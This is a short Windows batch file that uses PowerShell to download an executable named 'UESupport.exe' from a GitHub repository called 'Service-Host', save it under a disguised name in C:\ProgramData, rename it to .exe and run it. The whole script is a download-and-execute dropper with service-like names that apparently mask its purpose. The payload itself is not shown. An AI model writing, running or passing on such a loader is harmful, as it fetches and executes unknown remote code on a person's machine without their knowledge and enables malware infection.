@echo off
powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/AnonymousArabian/Service-Host/raw/master/UESupport.exe','C:\ProgramData\UEConfig')"
rename  C:\ProgramData\UEConfig UEConfig.exe
timeout 5
C:\ProgramData\UEConfig.exe